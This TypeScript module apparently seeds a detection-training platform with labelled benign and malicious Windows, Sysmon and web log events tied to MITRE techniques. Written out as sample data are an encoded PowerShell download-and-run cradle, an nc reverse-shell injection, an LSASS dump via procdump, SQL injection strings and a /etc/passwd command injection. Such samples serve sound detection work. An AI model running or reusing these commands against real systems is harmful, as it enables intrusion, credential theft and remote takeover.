import type { SecurityEvent, Dataset } from "@/types";

let eid = 0;
function ev(category: string, isMalicious: boolean, fields: Record<string, string>): SecurityEvent {
  eid += 1;
  const ts = new Date(2025, 6, 25, 9, Math.floor(eid % 60), eid % 60).toISOString();
  return { id: `EVT-${String(eid).padStart(4, "0")}`, timestamp: ts, category, is_malicious: isMalicious, ...fields };
}

// Windows Security Logs
const windowsEvents: SecurityEvent[] = [
  ev("process_creation", true, { EventID: "4688", Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", CommandLine: "powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAnACkA", User: "CORP\\svc-sql", ParentImage: "C:\\Windows\\System32\\services.exe" }),
  ev("process_creation", false, { EventID: "4688", Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", CommandLine: "powershell -Command Get-Process", User: "CORP\\jdoe", ParentImage: "C:\\Windows\\explorer.exe" }),
  ev("process_creation", true, { EventID: "4688", Image: "C:\\Windows\\System32\\rundll32.exe", CommandLine: "rundll32.exe C:\\Users\\Public\\payload.dll,Start", User: "CORP\\admin", ParentImage: "C:\\Windows\\System32\\cmd.exe" }),
  ev("process_creation", false, { EventID: "4688", Image: "C:\\Program Files\\Microsoft Office\\WINWORD.EXE", CommandLine: "WINWORD.EXE /n", User: "CORP\\jdoe", ParentImage: "C:\\Windows\\explorer.exe" }),
  ev("logon", true, { EventID: "4625", LogonType: "3", TargetUserName: "Administrator", IpAddress: "185.220.101.45", FailureReason: "%%2313" }),
  ev("logon", true, { EventID: "4625", LogonType: "3", TargetUserName: "Administrator", IpAddress: "185.220.101.45", FailureReason: "%%2313" }),
  ev("logon", true, { EventID: "4625", LogonType: "3", TargetUserName: "Administrator", IpAddress: "185.220.101.45", FailureReason: "%%2313" }),
  ev("logon", true, { EventID: "4625", LogonType: "3", TargetUserName: "Administrator", IpAddress: "185.220.101.45", FailureReason: "%%2313" }),
  ev("logon", false, { EventID: "4624", LogonType: "2", TargetUserName: "jdoe", IpAddress: "10.0.0.55", AuthenticationPackageName: "Negotiate" }),
  ev("logon", true, { EventID: "4624", LogonType: "9", TargetUserName: "svc-backup", IpAddress: "10.0.0.99", AuthenticationPackageName: "Kerberos", LogonProcessName: "NtLmSsp" }),
  ev("scheduled_task", true, { EventID: "4698", TaskName: "\\Microsoft\\Windows\\WindowsUpdate\\UpdateHelper", Action: "powershell.exe -w hidden -enc SQBFAFgA", Creator: "CORP\\svc-sql" }),
  ev("scheduled_task", false, { EventID: "4698", TaskName: "\\Microsoft\\Windows\\Defrag\\ScheduledDefrag", Action: "%systemroot%\\system32\\defrag.exe", Creator: "SYSTEM" }),
  ev("service_install", true, { EventID: "7045", ServiceName: "SvcHostUpdate", ServiceType: "User Mode Service", ServiceStartType: "Auto", ServiceFileName: "C:\\Users\\Public\\svc.exe" }),
  ev("service_install", false, { EventID: "7045", ServiceName: "MicrosoftEdgeUpdate", ServiceType: "Own Process", ServiceStartType: "Manual", ServiceFileName: '"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe"' }),
];

// Sysmon logs
const sysmonEvents: SecurityEvent[] = [
  ev("process_creation", true, { EventID: "1", Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", CommandLine: "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAnACkA", ParentImage: "C:\\Windows\\System32\\services.exe", User: "NT AUTHORITY\\SYSTEM", Hashes: "SHA256=ab12cd34ef56" }),
  ev("process_creation", false, { EventID: "1", Image: "C:\\Windows\\System32\\notepad.exe", CommandLine: "notepad.exe", ParentImage: "C:\\Windows\\explorer.exe", User: "CORP\\jdoe", Hashes: "SHA256=ff99ee77dd66" }),
  ev("process_creation", true, { EventID: "1", Image: "C:\\Windows\\System32\\lsass.exe", CommandLine: "C:\\Windows\\System32\\lsass.exe", ParentImage: "C:\\Windows\\System32\\procdump.exe", User: "NT AUTHORITY\\SYSTEM", GrantedAccess: "0x1410", Hashes: "SHA256=00deadbeef00" }),
  ev("network_connection", true, { EventID: "3", Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", DestinationIp: "185.220.101.45", DestinationPort: "4444", Protocol: "tcp", User: "CORP\\svc-sql" }),
  ev("network_connection", false, { EventID: "3", Image: "C:\\Program Files\\Mozilla Firefox\\firefox.exe", DestinationIp: "104.16.123.96", DestinationPort: "443", Protocol: "tcp", User: "CORP\\jdoe" }),
  ev("file_creation", true, { EventID: "11", TargetFilename: "C:\\Users\\Public\\payload.dll", Image: "C:\\Windows\\System32\\rundll32.exe", User: "CORP\\admin" }),
  ev("file_creation", false, { EventID: "11", TargetFilename: "C:\\Users\\jdoe\\Documents\\report.docx", Image: "C:\\Program Files\\Microsoft Office\\WINWORD.EXE", User: "CORP\\jdoe" }),
];

// Web access logs
const webEvents: SecurityEvent[] = [
  ev("web_access", true, { EventID: "HTTP", Method: "GET", Uri: "/products?id=1' OR '1'='1", ClientIP: "45.133.1.22", StatusCode: "200", UserAgent: "sqlmap/1.7" }),
  ev("web_access", true, { EventID: "HTTP", Method: "GET", Uri: "/search?q=;cat /etc/passwd", ClientIP: "45.133.1.22", StatusCode: "200", UserAgent: "curl/7.81.0" }),
  ev("web_access", true, { EventID: "HTTP", Method: "POST", Uri: "/api/login", ClientIP: "92.118.170.55", StatusCode: "200", Body: "admin' OR '1'='1'--", UserAgent: "python-requests/2.28" }),
  ev("web_access", false, { EventID: "HTTP", Method: "GET", Uri: "/products?id=42", ClientIP: "10.0.0.55", StatusCode: "200", UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }),
  ev("web_access", false, { EventID: "HTTP", Method: "GET", Uri: "/index.html", ClientIP: "10.0.0.55", StatusCode: "200", UserAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)" }),
  ev("web_access", false, { EventID: "HTTP", Method: "GET", Uri: "/about", ClientIP: "10.0.0.60", StatusCode: "200", UserAgent: "Mozilla/5.0 (X11; Linux x86_64)" }),
  ev("web_access", true, { EventID: "HTTP", Method: "GET", Uri: "/?cmd=| nc 185.220.101.45 4444 -e /bin/sh", ClientIP: "45.133.1.22", StatusCode: "500", UserAgent: "Mozilla/5.0" }),
];

export const SEED_DATASETS: Omit<Dataset, "id" | "created_at">[] = [
  {
    name: "Windows Security Logs — Process & Logon Events",
    category: "Windows Security",
    source_type: "Windows Event Log",
    description: "Curated Windows Security event log dataset covering process creation (4688), logon success/failure (4624/4625), scheduled task creation (4698), and service install (7045). Contains benign and malicious events.",
    event_count: windowsEvents.length,
    malicious_count: windowsEvents.filter((e) => e.is_malicious).length,
    benign_count: windowsEvents.filter((e) => !e.is_malicious).length,
    events: windowsEvents,
  },
  {
    name: "Sysmon — Process, Network & File Activity",
    category: "Sysmon",
    source_type: "Sysmon",
    description: "Sysmon EID 1 (process creation), EID 3 (network connection), and EID 11 (file creation) events. Includes encoded PowerShell, LSASS access, and C2 beaconing.",
    event_count: sysmonEvents.length,
    malicious_count: sysmonEvents.filter((e) => e.is_malicious).length,
    benign_count: sysmonEvents.filter((e) => !e.is_malicious).length,
    events: sysmonEvents,
  },
  {
    name: "Web Access Logs — Injection & Suspicious Requests",
    category: "Web Access",
    source_type: "HTTP",
    description: "Web server access logs containing SQL injection, command injection, and suspicious requests alongside normal traffic.",
    event_count: webEvents.length,
    malicious_count: webEvents.filter((e) => e.is_malicious).length,
    benign_count: webEvents.filter((e) => !e.is_malicious).length,
    events: webEvents,
  },
];

export function eventsForChallenge(mitreId: string): SecurityEvent[] {
  switch (mitreId) {
    case "T1059.001":
      return [...windowsEvents.filter((e) => e.category === "process_creation"), ...sysmonEvents.filter((e) => e.category === "process_creation")];
    case "T1003":
      return sysmonEvents.filter((e) => e.Image?.toString().includes("lsass") || e.category === "process_creation");
    case "T1053":
      return windowsEvents.filter((e) => e.category === "scheduled_task");
    case "T1550":
      return windowsEvents.filter((e) => e.EventID === "4624" || e.EventID === "4625");
    case "T1190":
      return webEvents;
    default:
      return windowsEvents;
  }
}
